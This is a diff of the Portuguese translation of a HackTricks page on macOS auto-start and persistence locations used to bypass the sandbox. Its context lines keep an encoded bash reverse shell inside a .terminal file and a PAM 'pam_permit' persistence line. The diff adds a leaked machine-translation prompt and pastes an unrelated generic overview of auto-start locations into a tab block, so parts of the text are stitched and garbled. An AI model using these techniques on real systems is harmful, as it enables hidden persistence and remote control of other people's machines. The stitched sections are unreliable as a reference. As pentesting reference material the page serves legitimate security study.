@@ -217,7 +217,7 @@ Você pode adicionar isso a partir da linha de comando com:
 ```
 {% endcode %}
 
-### Scripts do Terminal
+### Scripts do Terminal / Outras extensões de arquivo
 
 * Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -228,7 +228,7 @@ Você pode adicionar isso a partir da linha de comando com:
 
 #### Descrição e Exploração
 
-Se você criar um script **`.terminal`** e abri-lo, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.
+Se você criar um script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e abri-lo, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver alguns privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.
 
 Experimente com:
 ```bash
@@ -258,14 +258,16 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
+Você também pode usar as extensões **`.command`** e **`.tool`**, com conteúdo de scripts regulares do shell, e eles também serão abertos pelo Terminal.
+
 {% hint style="danger" %}
 Se o terminal tiver **Acesso Total ao Disco**, ele poderá concluir essa ação (observe que o comando executado será visível em uma janela do terminal).
 {% endhint %}
 
 ### Plugins de Áudio
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
-Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+Artigo: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
+Artigo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 #### Localização
 
@@ -283,11 +285,11 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 #### Descrição
 
-De acordo com os writeups anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.
+De acordo com os artigos anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.
 
 ### Plugins QuickLook
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
+Artigo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -301,7 +303,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.
 
 #### Descrição e Exploração
 
-Os plugins QuickLook podem ser executados quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporte esse tipo de arquivo** esteja instalado.
+Os plugins QuickLook podem ser executados quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporta esse tipo de arquivo** está instalado.
 
 É possível compilar seu próprio plugin QuickLook, colocá-lo em uma das localizações anteriores para carregá-lo e, em seguida, ir para um arquivo suportado e pressionar espaço para ativá-lo.
 
@@ -311,7 +313,7 @@ Os plugins QuickLook podem ser executados quando você **aciona a visualização
 Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root.
 {% endhint %}
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
+**Artigo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
 
 Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -441,7 +443,7 @@ Os Startup Items são aplicativos ou scripts que são configurados para iniciar 
 
 ## 5. Cron Jobs
 
-Os Cron Jobs são tarefas agendadas que são executadas em intervalos regulares. Eles são configurados usando o utilitário `cron` e são específicos para cada usuário. Os Cron Jobs podem ser usados para iniciar aplicativos ou scripts em horários específicos.
+Os Cron Jobs são tarefas agendadas que são executadas automaticamente em intervalos específicos. Eles são configurados usando o utilitário `cron` e são específicos para cada usuário. Os Cron Jobs podem ser usados para iniciar aplicativos ou scripts em horários específicos.
 
 ## 6. LaunchAgents Globais
 
@@ -511,7 +513,7 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 
 Artigo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)
 
-* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Mas o xbar deve estar instalado
 
 #### Localização
@@ -523,7 +525,7 @@ Artigo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.g
 
 **Artigo**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)
 
-Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
+Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
 
 #### Localização
 
@@ -532,7 +534,7 @@ Artigo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.g
 
 #### Descrição
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) é uma ferramenta de automação que permite a **scripting do macOS através da linguagem de script LUA**. Podemos até incorporar código AppleScript completo, bem como executar scripts de shell.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) é uma ferramenta de automação que permite a **scripting do macOS através da linguagem de script LUA**. Podemos até incorporar código completo do AppleScript, bem como executar scripts de shell.
 
 O aplicativo procura por um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado, o script será executado.
 ```bash
@@ -622,7 +624,7 @@ Artigo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.g
 #### **Descrição**
 
 "As tarefas at" são usadas para **agendar tarefas em horários específicos**.\
-Essas tarefas diferem do cron no sentido de que **são tarefas únicas** que são removidas após a execução. No entanto, elas **sobreviverão a uma reinicialização do sistema**, portanto, não podem ser descartadas como uma ameaça potencial.
+Essas tarefas diferem do cron no sentido de que **são tarefas únicas** que são removidas após a execução. No entanto, elas **sobrevivem a uma reinicialização do sistema**, portanto, não podem ser descartadas como uma ameaça potencial.
 
 Por **padrão**, elas estão **desabilitadas**, mas o usuário **root** pode **habilitá-las** com:
 ```bash
@@ -747,7 +749,7 @@ var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
 se.folderActions.push(fa);
 fa.scripts.push(myScript);
 ```
-Execute o script com: `osascript -l JavaScript /Users/username/attach.scpt`
+Executar script com: `osascript -l JavaScript /Users/username/attach.scpt`
 
 
 
@@ -915,7 +917,7 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilb
 
 **Compile um pacote** de seletor de cores com seu código (você pode usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o pacote para `~/Library/ColorPickers`.
 
-Então, quando o seletor de cores for acionado, seu código também será.
+Então, quando o seletor de cores for acionado, seu código também deverá ser.
 
 Observe que o binário que carrega sua biblioteca tem um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
@@ -945,7 +947,7 @@ Observe que o binário que carrega sua biblioteca tem um **sandbox muito restrit
 
 Um exemplo de aplicativo com uma Extensão do Finder Sync [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).
 
-Os aplicativos podem ter `Extensões do Finder Sync`. Essa extensão será inserida em um aplicativo que será executado. Além disso, para que a extensão possa executar seu código, **ela deve ser assinada** com um certificado válido de desenvolvedor da Apple, deve estar **em sandbox** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
+Os aplicativos podem ter `Extensões do Finder Sync`. Essa extensão será inserida em um aplicativo que será executado. Além disso, para que a extensão possa executar seu código, **ela deve ser assinada** com um certificado válido de desenvolvedor da Apple, deve estar **sandboxed** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -1083,7 +1085,7 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 O Spotlight é o recurso de pesquisa integrado do macOS, projetado para fornecer aos usuários acesso rápido e abrangente aos dados em seus computadores.\
 Para facilitar essa capacidade de pesquisa rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo pesquisas rápidas tanto por nomes de arquivos quanto por seu conteúdo.
 
-O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que executam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins importadores do Spotlight, ou **".mdimporter bundles**", que permitem que o Spotlight entenda e indexe conteúdo em uma variedade diversificada de formatos de arquivo.
+O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins importadores do Spotlight, ou **".mdimporter bundles**", que permitem que o Spotlight entenda e indexe conteúdo em uma variedade diversificada de formatos de arquivo.
 
 Os plugins ou pacotes **`.mdimporter`** estão localizados nos locais mencionados anteriormente e, se um novo pacote aparecer, ele é carregado em minutos (não é necessário reiniciar nenhum serviço). Esses pacotes precisam indicar quais **tipos de arquivo e extensões eles podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.
 
@@ -1133,12 +1135,12 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 {% hint style="danger" %}
-Se você verificar o Plist de outros `mdimporter`, pode ser que não encontre a entrada **`UTTypeConformsTo`**. Isso ocorre porque é um _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type_Identifier)) embutido e não precisa especificar extensões.
+Se você verificar o Plist de outros `mdimporter`, pode ser que não encontre a entrada **`UTTypeConformsTo`**. Isso ocorre porque é um _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) embutido e não precisa especificar extensões.
 
 Além disso, os plugins padrão do sistema sempre têm precedência, portanto, um invasor só pode acessar arquivos que não são indexados pelos próprios `mdimporters` da Apple.
 {% endhint %}
 
-Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e, em seguida, alterar o nome, os **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que ele suporte a extensão que você deseja e reflita isso em **`schema.xml`**.\
+Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e, em seguida, alterar o nome, os **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que ele suporte a extensão que você deseja e refleti-los em **`schema.xml`**.\
 Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar sua carga útil quando um arquivo com a extensão processada for criado.
 
 Finalmente, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**
@@ -1167,7 +1169,7 @@ Parece que isso não está mais funcionando.
 ## Bypass do Sandbox Root
 
 {% hint style="success" %}
-Aqui você pode encontrar locais de início úteis para **contornar o sandbox** que permite simplesmente executar algo **escrevendo em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas**.
+Aqui você pode encontrar locais de início úteis para **contornar o sandbox** que permite simplesmente executar algo **escrevendo-o em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas**.
 {% endhint %}
 
 ### Periódico
@@ -1260,7 +1262,7 @@ Uma técnica de persistência/escalada de privilégios que abusa do PAM é tão 
 ```bash
 auth       sufficient     pam_permit.so
 ```
-O seguinte é o conteúdo de um livro sobre técnicas de hacking. O conteúdo a seguir é do arquivo macos-hardening/macos-auto-start-locations.md. Traduza o texto relevante para o português e retorne a tradução mantendo exatamente a mesma sintaxe de markdown e html. Não traduza coisas como código, nomes de técnicas de hacking, palavras relacionadas a hacking, nomes de plataformas de nuvem/SaaS (como Workspace, aws, gcp...), a palavra 'leak', pentesting e tags de markdown. Além disso, não adicione nada além da tradução e da sintaxe de markdown.
+O seguinte é o conteúdo de um livro sobre técnicas de hacking. O conteúdo a seguir é do arquivo macos-hardening/macos-auto-start-locations.md. Traduza o texto relevante para o português e retorne a tradução mantendo exatamente a mesma sintaxe markdown e html. Não traduza coisas como código, nomes de técnicas de hacking, palavras de hacking, nomes de plataformas de nuvem/SaaS (como Workspace, aws, gcp...), a palavra 'leak', pentesting e tags markdown. Além disso, não adicione nada além da tradução e da sintaxe markdown.
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1458,7 +1460,59 @@ Após colocar um novo diretório em uma dessas duas localizações, **mais dois 
 </dict>
 </plist>
 ```
-{% tab title="supernomeservico" %}
+{% tab title="superservicename" %}
+
+# Localizações de Inicialização Automática do macOS
+
+O macOS possui várias localizações onde os aplicativos podem ser configurados para iniciar automaticamente quando o sistema é inicializado. Essas localizações são usadas por aplicativos legítimos para fornecer funcionalidades adicionais ou para iniciar serviços em segundo plano.
+
+No entanto, essas localizações também podem ser exploradas por atacantes para iniciar aplicativos maliciosos ou scripts de inicialização que podem comprometer a segurança do sistema.
+
+Aqui estão algumas das principais localizações de inicialização automática do macOS:
+
+## 1. LaunchAgents
+
+Os LaunchAgents são arquivos de propriedade do usuário que são executados quando o usuário faz login. Eles são armazenados no diretório `~/Library/LaunchAgents` e têm a extensão `.plist`. Esses arquivos podem ser usados para iniciar aplicativos ou scripts de inicialização quando o usuário faz login.
+
+## 2. LaunchDaemons
+
+Os LaunchDaemons são arquivos de propriedade do sistema que são executados quando o sistema é inicializado. Eles são armazenados no diretório `/Library/LaunchDaemons` e têm a extensão `.plist`. Esses arquivos são usados para iniciar serviços em segundo plano ou aplicativos que não requerem interação do usuário.
+
+## 3. StartupItems
+
+Os StartupItems são um método mais antigo de inicialização automática e são usados principalmente em versões mais antigas do macOS. Eles são armazenados no diretório `/Library/StartupItems` e podem conter scripts de inicialização ou aplicativos que são executados durante a inicialização do sistema.
+
+## 4. Login Items
+
+Os Login Items são aplicativos ou scripts que são configurados para iniciar automaticamente quando um usuário faz login. Eles são gerenciados nas preferências do sistema, na seção "Usuários e Grupos". Os Login Items são específicos para cada usuário e podem ser usados para iniciar aplicativos ou scripts personalizados quando o usuário faz login.
+
+## 5. Cron Jobs
+
+Os Cron Jobs são tarefas agendadas que são executadas em intervalos regulares. Eles podem ser usados para iniciar aplicativos ou scripts de inicialização em horários específicos. Os Cron Jobs são configurados usando o utilitário `cron` e os arquivos de configuração estão localizados no diretório `/usr/lib/cron/tabs`.
+
+## 6. LaunchAgents Globais
+
+Os LaunchAgents Globais são arquivos de propriedade do sistema que são executados quando qualquer usuário faz login. Eles são armazenados no diretório `/Library/LaunchAgents` e têm a extensão `.plist`. Esses arquivos são usados para iniciar aplicativos ou scripts de inicialização que devem ser executados para todos os usuários.
+
+## 7. LaunchDaemons Globais
+
+Os LaunchDaemons Globais são arquivos de propriedade do sistema que são executados quando o sistema é inicializado. Eles são armazenados no diretório `/Library/LaunchDaemons` e têm a extensão `.plist`. Esses arquivos são usados para iniciar serviços em segundo plano ou aplicativos que não requerem interação do usuário e devem ser executados para todos os usuários.
+
+## 8. XPC Services
+
+As XPC Services são serviços que podem ser iniciados por outros aplicativos. Elas são armazenadas no diretório `/Library/XPCServices` e têm a extensão `.xpc`. Esses serviços podem ser usados para fornecer funcionalidades adicionais a outros aplicativos.
+
+## 9. Login Hooks
+
+Os Login Hooks são scripts que são executados quando um usuário faz login. Eles são armazenados no diretório `/etc` e têm o nome `loginhook` ou `logouthook`. Esses scripts podem ser usados para executar ações personalizadas durante o processo de login ou logout.
+
+## 10. Kernel Extensions
+
+As Kernel Extensions são módulos de código que podem ser carregados no kernel do macOS. Elas são armazenadas no diretório `/System/Library/Extensions` e têm a extensão `.kext`. Essas extensões podem ser usadas para adicionar funcionalidades ao sistema operacional.
+
+É importante monitorar e revisar regularmente essas localizações de inicialização automática para garantir que apenas aplicativos e serviços legítimos estejam sendo executados. A remoção de arquivos ou configurações suspeitas nessas localizações pode ajudar a proteger o sistema contra ataques maliciosos.
+
+{% endtab %}
 ```bash
 #!/bin/sh
 . /etc/rc.common
@@ -1483,14 +1537,14 @@ RunService "$1"
 ### emond
 
 {% hint style="danger" %}
-Não consigo encontrar esse componente no meu macOS, então para mais informações, verifique o writeup
+Não consigo encontrar esse componente no meu macOS, então para mais informações, verifique o artigo
 {% endhint %}
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
+Artigo: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
 
 A Apple introduziu um mecanismo de registro chamado **emond**. Parece que nunca foi totalmente desenvolvido e o desenvolvimento pode ter sido **abandonado** pela Apple em favor de outros mecanismos, mas ainda está **disponível**.
 
-Este serviço pouco conhecido pode **não ser muito útil para um administrador de Mac**, mas para um ator de ameaça, uma razão muito boa seria usá-lo como um **mecanismo de persistência que a maioria dos administradores do macOS provavelmente não saberia** procurar. Detectar o uso malicioso do emond não deve ser difícil, pois o System LaunchDaemon para o serviço procura scripts para serem executados em apenas um local:
+Este serviço pouco conhecido pode **não ser muito útil para um administrador de Mac**, mas para um ator de ameaça, uma razão muito boa seria usá-lo como um **mecanismo de persistência que a maioria dos administradores do macOS provavelmente não saberia** procurar. Detectar o uso malicioso do emond não deve ser difícil, pois o System LaunchDaemon para o serviço procura scripts para serem executados apenas em um único local:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1544,7 +1598,7 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevil
 
 #### Descrição e exploração
 
-Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria chamado.
+Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria executado.
 
 Não consigo mais encontrar isso no meu macOS.
 
@@ -1560,7 +1614,7 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevil
 
 #### Descrição e exploração
 
-Aparentemente, não é muito comum executar esse script e nem mesmo consegui encontrá-lo no meu macOS, então se você quiser mais informações, verifique o writeup.
+Aparentemente, não é muito comum executar esse script e nem mesmo consegui encontrá-lo no meu macOS, então se você quiser mais informações, verifique o artigo.
 
 ### ~~/etc/rc.common~~
 
@@ -1673,7 +1727,7 @@ esac
 * Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
